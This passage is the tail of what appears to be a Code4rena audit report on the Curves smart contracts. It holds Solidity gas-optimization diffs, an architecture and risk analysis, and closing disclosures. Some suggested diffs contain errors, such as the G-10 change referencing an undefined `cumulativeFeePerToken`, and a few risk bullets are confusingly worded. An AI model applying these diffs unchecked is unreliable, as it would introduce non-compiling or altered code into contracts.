496:        if (externalToken == address(0)) revert TokenAbsentForCurvesTokenSubject();
497:        if (amount > CurvesERC20(externalToken).balanceOf(msg.sender)) revert InsufficientBalance();
498:        if (tokenAmount > curvesTokenBalance[curvesTokenSubject][address(this)]) revert InsufficientBalance();

500:        CurvesERC20(externalToken).burn(msg.sender, amount);
501:        _transfer(curvesTokenSubject, address(this), msg.sender, tokenAmount);
502:    }
```

On Line 493, we are caching the value of `externalCurvesTokens[curvesTokenSubject].token` but if we go back to the calling function, we make another state read to the same state variable. We can inline the function deposit to avoid making state reads twice:

```diff

     function sellExternalCurvesToken(address curvesTokenSubject, uint256 amount) public {
-        if (externalCurvesTokens[curvesTokenSubject].token == address(0)) revert TokenAbsentForCurvesTokenSubject();
+        if (amount % 1 ether != 0) revert NonIntegerDepositAmount();
+        address externalToken = externalCurvesTokens[curvesTokenSubject].token;
+        if (externalToken == address(0)) revert TokenAbsentForCurvesTokenSubject();
+        uint256 tokenAmount = amount / 1 ether;

-        deposit(curvesTokenSubject, amount);
+        if (amount > CurvesERC20(externalToken).balanceOf(msg.sender)) revert InsufficientBalance();
+        if (tokenAmount > curvesTokenBalance[curvesTokenSubject][address(this)]) revert InsufficientBalance();
+
+        CurvesERC20(externalToken).burn(msg.sender, amount);
+        _transfer(curvesTokenSubject, address(this), msg.sender, tokenAmount);
         sellCurvesToken(curvesTokenSubject, amount / 1 ether);
     }
 }
```

## [G-08] Only Make SLOADS when necessary

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L63-L71

```solidity
File: /contracts/FeeSplitter.sol
63:    function updateFeeCredit(address token, address account) internal {
64:        TokenData storage data = tokensData[token];
65:        uint256 balance = balanceOf(token, account);
66:        if (balance > 0) {
67:            uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[account]) * balance;
68:            data.unclaimedFees[account] += owed / PRECISION;
69:            data.userFeeOffset[account] = data.cumulativeFeePerToken;
70:        }
71:    }
```

In function `updateFeeCredit`, the variable `data` is only used when `balance > 0`; therefore, there's no need to make a state read if we are not going to make use of it.

```diff
     function updateFeeCredit(address token, address account) internal {
-        TokenData storage data = tokensData[token];
         uint256 balance = balanceOf(token, account);
         if (balance > 0) {
+            TokenData storage data = tokensData[token];
             uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[account]) * balance;
             data.unclaimedFees[account] += owed / PRECISION;
             data.userFeeOffset[account] = data.cumulativeFeePerToken;
```

If balance is not greater than `0`, then we save ourselves one entire SLOAD.

## [G-09] Reorder the checks to have cheaper checks first

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L490-L502

```solidity
File: /contracts/Curves.sol
490:    function deposit(address curvesTokenSubject, uint256 amount) public {
491:        if (amount % 1 ether != 0) revert NonIntegerDepositAmount();

493:        address externalToken = externalCurvesTokens[curvesTokenSubject].token;
494:        uint256 tokenAmount = amount / 1 ether;

496:        if (externalToken == address(0)) revert TokenAbsentForCurvesTokenSubject();
497:        if (amount > CurvesERC20(externalToken).balanceOf(msg.sender)) revert InsufficientBalance();
498:        if (tokenAmount > curvesTokenBalance[curvesTokenSubject][address(this)]) revert InsufficientBalance();

500:        CurvesERC20(externalToken).burn(msg.sender, amount);
501:        _transfer(curvesTokenSubject, address(this), msg.sender, tokenAmount);
502:    }
```

```diff
     function deposit(address curvesTokenSubject, uint256 amount) public {
-        if (amount % 1 ether != 0) revert NonIntegerDepositAmount();
-
+        if (amount % 1 ether != 0) revert NonIntegerDepositAmount();//@audit Ensure users deposit an amount that will be divisible by 1 ether
+
+        uint256 tokenAmount = amount / 1 ether;//@audit-ok safe because of the earlier check
+        if (tokenAmount > curvesTokenBalance[curvesTokenSubject][address(this)]) revert InsufficientBalance();//@audit is this more expensive?
+
         address externalToken = externalCurvesTokens[curvesTokenSubject].token;
-        uint256 tokenAmount = amount / 1 ether;
-
         if (externalToken == address(0)) revert TokenAbsentForCurvesTokenSubject();
+
         if (amount > CurvesERC20(externalToken).balanceOf(msg.sender)) revert InsufficientBalance();
-        if (tokenAmount > curvesTokenBalance[curvesTokenSubject][address(this)]) revert InsufficientBalance();

         CurvesERC20(externalToken).burn(msg.sender, amount);
         _transfer(curvesTokenSubject, address(this), msg.sender, tokenAmount);
```

## [G-10] Cache storage values in memory to minimize SLOADs

The code can be optimized by minimizing the number of SLOADs.

SLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.

### We can cache the variable `_curvesTokenCounter` in memory and then assign it (Saves 144 Gas on average)

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L338-L348

**Gas benchmarks based on function `withdraw()`**:

|        | Min    | Max | Avg   | 
| ------ | --- | ------- | ----- |
| Before | 153428    | 1813418   | 1689234 | 
| After  | 153428    | 1813218   | 1689088 | 

```solidity
File: /contracts/Curves.sol
338    function _deployERC20(

344:        if (keccak256(bytes(symbol)) == keccak256(bytes(DEFAULT_SYMBOL))) {
345:            _curvesTokenCounter += 1;
346:            name = string(abi.encodePacked(name, " ", Strings.toString(_curvesTokenCounter)));
347:            symbol = string(abi.encodePacked(symbol, Strings.toString(_curvesTokenCounter)));
348:        }
```

We can do some caching for `_curvesTokenCounter`:

```diff
     function _deployERC20(
         address curvesTokenSubject,
@@ -342,9 +346,10 @@ contract Curves is CurvesErrors, Security {
     ) internal returns (address) {
         // If the token's symbol is CURVES, append a counter value
         if (keccak256(bytes(symbol)) == keccak256(bytes(DEFAULT_SYMBOL))) {
-            _curvesTokenCounter += 1;
-            name = string(abi.encodePacked(name, " ", Strings.toString(_curvesTokenCounter)));
-            symbol = string(abi.encodePacked(symbol, Strings.toString(_curvesTokenCounter)));
+            uint256 counter = _curvesTokenCounter + 1;
+            name = string(abi.encodePacked(name, " ", Strings.toString(counter)));
+            symbol = string(abi.encodePacked(symbol, Strings.toString(counter)));
+            _curvesTokenCounter = counter;
         }
```

### Save 1 SLOAD by caching `data.cumulativeFeePerToken`(Save 74 Gas on average)

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L63-L71

|        | Min    | Max | Avg   | 
| ------ | --- | ------- | ----- | 
| Before | -    | -   | 77744 | 
| After  | -    | -   | 77670 | 

```solidity
File: /contracts/FeeSplitter.sol
63:    function updateFeeCredit(address token, address account) internal {
64:        TokenData storage data = tokensData[token];
65:        uint256 balance = balanceOf(token, account);
66:        if (balance > 0) {
67:            uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[account]) * balance;
68:            data.unclaimedFees[account] += owed / PRECISION;
69:            data.userFeeOffset[account] = data.cumulativeFeePerToken;
70:        }
71:    }
```

```diff
@@ -64,15 +64,16 @@ contract FeeSplitter is Security {
         TokenData storage data = tokensData[token];
         uint256 balance = balanceOf(token, account);
         if (balance > 0) {
-            uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[account]) * balance;
+            uint256 _cumulativeFeePerToken = cumulativeFeePerToken;
+            uint256 owed = (_cumulativeFeePerToken - data.userFeeOffset[account]) * balance;
             data.unclaimedFees[account] += owed / PRECISION;
-            data.userFeeOffset[account] = data.cumulativeFeePerToken;
+            data.userFeeOffset[account] = _cumulativeFeePerToken;
         }
     }
```

## [G-11] Using unchecked blocks to save gas

Solidity version `0.8+` comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn’t possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an unchecked block.
[See this resource](https://github.com/ethereum/solidity/issues/10695).

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L277-L279

```solidity
File: /contracts/Curves.sol
277:        if (curvesTokenBalance[curvesTokenSubject][msg.sender] - amount == 0) {
278:            _addOwnedCurvesTokenSubject(msg.sender, curvesTokenSubject);
279:        }
```
The operation `curvesTokenBalance[curvesTokenSubject][msg.sender] - amount` cannot underflow. The current value of `curvesTokenBalance[curvesTokenSubject][msg.sender]` is simply a result of adding `amount` to the `curvesTokenBalance[curvesTokenSubject][msg.sender]` therefore subtracting again should be safe

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L287

```solidity
File: /contracts/Curves.sol
287:        uint256 price = getPrice(supply - amount, amount);
```

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L289

```solidity
File: /contracts/Curves.sol
289:        curvesTokenBalance[curvesTokenSubject][msg.sender] -= amount;
```

Before the operation is performed, a check exists that ensures that ` curvesTokenBalance[curvesTokenSubject][msg.sender]` is greater than `amount`.

## [G-12] No need to cache state reads if using once

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L394-L402

### Variable `supply` is only used therefore no need to cache `curvesTokenSupply[msg.sender]`

```solidity
File: /contracts/Curves.sol
394:    function setWhitelist(bytes32 merkleRoot) external {
395:        uint256 supply = curvesTokenSupply[msg.sender];
396:        if (supply > 1) revert CurveAlreadyExists();

398:        if (presalesMeta[msg.sender].merkleRoot != merkleRoot) {
399:            presalesMeta[msg.sender].merkleRoot = merkleRoot;
400:            emit WhitelistUpdated(msg.sender, merkleRoot);
401:        }
402:    }
```

The variable `supply` is only used once in the function. As such, there was no need to cache the value of `curvesTokenSupply[msg.sender]`. Caching only adds to the gas consumption rather than save us some gas. 
 
```diff
     function setWhitelist(bytes32 merkleRoot) external {
-        uint256 supply = curvesTokenSupply[msg.sender];
-        if (supply > 1) revert CurveAlreadyExists();
+        if (curvesTokenSupply[msg.sender] > 1) revert CurveAlreadyExists();

         if (presalesMeta[msg.sender].merkleRoot != merkleRoot) {
             presalesMeta[msg.sender].merkleRoot = merkleRoot;
```

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L377-L392

### Do not cache `curvesTokenSupply[curvesTokenSubject]`, as it's only required once

```solidity
File: /contracts/Curves.sol
377:    function buyCurvesTokenForPresale(
378:        address curvesTokenSubject,
379:        uint256 amount,
380:        uint256 startTime,
381:        bytes32 merkleRoot,
382:        uint256 maxBuy
383:    ) public payable onlyTokenSubject(curvesTokenSubject) {
384:        if (startTime <= block.timestamp) revert InvalidPresaleStartTime();
385:        uint256 supply = curvesTokenSupply[curvesTokenSubject];
386:        if (supply != 0) revert CurveAlreadyExists();
387:        presalesMeta[curvesTokenSubject].startTime = startTime;
388:        presalesMeta[curvesTokenSubject].merkleRoot = merkleRoot;
389:        presalesMeta[curvesTokenSubject].maxBuy = (maxBuy == 0 ? type(uint256).max : maxBuy);

391:        _buyCurvesToken(curvesTokenSubject, amount);
392:    }
```

```diff
     ) public payable onlyTokenSubject(curvesTokenSubject) {
         if (startTime <= block.timestamp) revert InvalidPresaleStartTime();
-        uint256 supply = curvesTokenSupply[curvesTokenSubject];
-        if (supply != 0) revert CurveAlreadyExists();
+        if (curvesTokenSupply[curvesTokenSubject] != 0) revert CurveAlreadyExists();
         presalesMeta[curvesTokenSubject].startTime = startTime;
         presalesMeta[curvesTokenSubject].merkleRoot = merkleRoot;
         presalesMeta[curvesTokenSubject].maxBuy = (maxBuy == 0 ? type(uint256).max : maxBuy);
```

### Supply is only used once, no need to cache `curvesTokenSupply[curvesTokenSubject]`

https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L370-L371

```solidity
File: /contracts/Curves.sol
370:        uint256 supply = curvesTokenSupply[curvesTokenSubject];
371:        if (supply != 0) revert CurveAlreadyExists();
```

## Conclusion

It is important to emphasize that the provided recommendations aim to enhance the efficiency of the code without compromising its readability. We understand the value of maintainable and easily understandable code to both developers and auditors.

As you proceed with implementing the suggested optimizations, please exercise caution and be diligent in conducting thorough testing. It is crucial to ensure that the changes are not introducing any new vulnerabilities and that the desired performance improvements are achieved. Review code changes, and perform thorough testing to validate the effectiveness and security of the refactored code.

Should you have any questions or need further assistance, please don't hesitate to reach out.

***

# Audit Analysis

For this audit, 16 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2024-01-curves-findings/issues/1510) by **MrPotatoMagic** received the top score from the judge.

*The following wardens also submitted reports: [yongskiws](https://github.com/code-423n4/2024-01-curves-findings/issues/1502), [fouzantanveer](https://github.com/code-423n4/2024-01-curves-findings/issues/1490), [Arion](https://github.com/code-423n4/2024-01-curves-findings/issues/1422), [0xAadi](https://github.com/code-423n4/2024-01-curves-findings/issues/1416), [Sathish9098](https://github.com/code-423n4/2024-01-curves-findings/issues/1399), [0xepley](https://github.com/code-423n4/2024-01-curves-findings/issues/1287), [DarkTower](https://github.com/code-423n4/2024-01-curves-findings/issues/1147), [0xSmartContract](https://github.com/code-423n4/2024-01-curves-findings/issues/910), [hunter\_w3b](https://github.com/code-423n4/2024-01-curves-findings/issues/784), [dimulski](https://github.com/code-423n4/2024-01-curves-findings/issues/756), [ZanyBonzy](https://github.com/code-423n4/2024-01-curves-findings/issues/284), [tala7985](https://github.com/code-423n4/2024-01-curves-findings/issues/1263), [bengyles](https://github.com/code-423n4/2024-01-curves-findings/issues/1229), [catellatech](https://github.com/code-423n4/2024-01-curves-findings/issues/928), and [peanuts](https://github.com/code-423n4/2024-01-curves-findings/issues/438).*

## Preface

This audit report should be approached with the following points in mind:

 - The report does not include repetitive documentation that the team is already aware of. It does include suggestions to provide more clarity on certain aspects in the documentation.
 - The report is crafted towards providing the sponsors with value such as unknown edge case scenarios, faulty developer assumptions and unnoticed architecture-level weak spots.
 - If there exists repetitive documentation (mainly in Mechanism Review), it is to provide the judge with more context on a specific high-level or in-depth scenario for ease of understandability.

## Approach taken in evaluating the codebase

### Time spent on this audit: 7 days

**Day 1:**
 - Getting a grasp over the friend.tech documentation.
 - Reviewing smaller nSLOC contracts.
 - Adding inline bookmarks for surface level issues.

**Days 2-4:**
 - Reviewing Curves.sol and FeeSpliter.sol.
 - Adding inline bookmarks to make notes, issues and imaginary attack scenarios.
 - Reviewing added features in current codebase over friend.tech.

**Days 5-7:**
 - Writing reports for simpler issues.
 - Writing gas optimizations report.
 - Filtering out inline bookmarks for invalid and QA level issues.
 - Writing QA report.
 - Writing reports for issues and testing their feasibility.
 - Writing analysis report.

## Architecture Recommendations

### What's unique?

- Exporting ERC20 tokens - The SocialFi sector is not huge as of yet. By creating a market not only with shares but also exportable custom ERC20 tokens, the protocol provides users flexibility to use their funds elsewhere. For example: Uniswap pools or bridge lockers or yield bearing vaults.
- Presale/Opensale system - The presale and opensale system is quite common in the NFT and ERC20 token launch sectors. But implementing them for obtaining shares of a token subject allows a user to strengthen their relationship with followers. Additionally, it creates social value and reputation for a person based on social credit.
- Re-integration of ERC20 tokens - Exporting tokens from the protocol is one half of the coin. The other half of reintegration is crucial since it allows users to leverage their strategies by earning ETH fees in the Curves protocol itself.

### How this codebase compares to Friend.tech
- The first difference between both codebases is that there are two new fee percentages included, namely, the `referralFeePercent` and `holderFeePercent`.
- The second difference is that the current protocol has optimized the friend tech code by creating logical functions such as `_transferFees()` to avoid repetitive code ([see how friend tech implements this](https://basescan.org/address/0xcf205808ed36593aa40a44f10c7f7c2f67d4a4d4#code)).
- The third difference is the inclusion of fee rewards to token holders. Friend tech's daily active users plummeted from around 5000 to 500 in a span of few months. This is bad for friend tech considering that it is a socialFi protocol. The Curves team has resolved this issue by allowing users to earn fees on the shares they hold. This avoids creating Curves into a market for MEV extractors and tilts it towards a long term investment opportunity for users.

### What ideas could be incorporated?
- Currently only integer units are allowed to be deposited through the `deposit()` function. This will cause the reintegration to fail if a user holds non-integer amounts of tokens. Since we cannot go break the conversion from the 18 decimals format in the `deposit()` function, a good straightforward solution to this would be to introduce a vault for the users by the Curves team. This vault can allow users to deposit their ERC20 curves tokens. Once the number of tokens for a token subject in the vault reaches a whole integer number, an administrator can call [`sellExternalCurveTokens()`](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L504) on the Curves contract which will give the vault ETH, that can then be distributed among the users who deposited their ERC20 tokens in it. The ETH would obviously need to be distributed based on the ratio or weight the users provide. There can be better solutions than this but in this simple solution above I've tried to ensure no new component other than a vault is introduced to aggregate the tokens to a whole integer number. 
- Another possible idea that could be incorporated is to lock the first token as a NFT for the token subject who initiates the curve. Since the token is free to mint, it could use generative art to determine a protocol pfp or some kind of NFT to welcome the user to Curves.
- A possible integration would that of ERC20 tokens. Currently payments are only accepted in ETH. If new tokens are added to the protocol, it can improve the user onboarding and provide users with more options to buy shares.
- Introducing yield-bearing strategies would be a good feature as well since once a token is exported, there might not be much a user could do with it. Implementing some kind of liquidity pools and strategies can solve this issue for users though this requires considerable development effort.

## Centralization Risks

There are two centralization risks in the protocol:
1. The owner has control over the protocol fees and managers. This owner address should use a multisig to avoid malicious percentage changes in the fee mechanism especially.
2. The managers have control over how much fees the subject and referral must earn as well as the token holder fees.

## Resources used to gain deeper context on this codebase

1. [Form network resources](https://info.form.network/)
2. [Friend tech contract breakdown](https://medium.com/valixconsulting/friend-tech-smart-contract-breakdown-c5588ae3a1cf)
3. [Friend tech contract itself to diff with existing Curves contract](https://basescan.org/address/0xcf205808ed36593aa40a44f10c7f7c2f67d4a4d4#code)

## Mechanism Review

### High Level System Overview

*Note: to view the provided images, please see the original submission [here](https://github.com/code-423n4/2024-01-curves-findings/issues/1510).*

### Inheritance Structure

Since there are only 5 contracts in scope, it is easy to get a grasp of the overall inheritance structure in the codebase. The contracts marked other than blue [in the provided image here](https://github.com/code-423n4/2024-01-curves-findings/issues/1510) are out of scope.

## Systemic Risks/Architecture weak spots and how they can be mitigated

- Preventing users from buying - Currently a token subject can block users from selling shares and withdrawing their ETH. This is because the contract uses a push over pull mechanism that allows the subject to revert in its fallback.
- Frontrunning/Sandwiching - The codebase is currently prone to MEV attacks due to missing slippage protection. This gives the user a worse execution price.
- Address poisoning - Currently in the protocol, `0` value transfers are allowed. This means that when the frontend pulls in the recent transfers, an user might send tokens to the wrong address.
- DOSing custom token names and symbol - The `withdraw()` functions allows passing `0` as a amount which allows an attacker to deploy an ERC20 token for the token subject but with default name and symbol. This might be against what the token subject wanted and should be fixed by disabling `0` value withdrawals.
- Phishing attacks - The `deploy()` function in the `CurvesERC20TokenFactory` is public currently. This allows an attacker to create similar tokens with names and symbols but with different owners. This could be used to fool users through social engineering tactics in public communities.
- Another important systemic risk is that the `getFees()` function correctly uses incorrect denominator of 1e18. This should be replaced with `maxFeePercent` since each of the protocol, subject, referral and holder fees are scaled according to the order of magnitude the `maxFeePercent` resides in. Therefore, if `maxFeePercent` is ever set to a value other than 1e18, it would cause users to be charged more or less fees.

### Time spent

60 hours

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
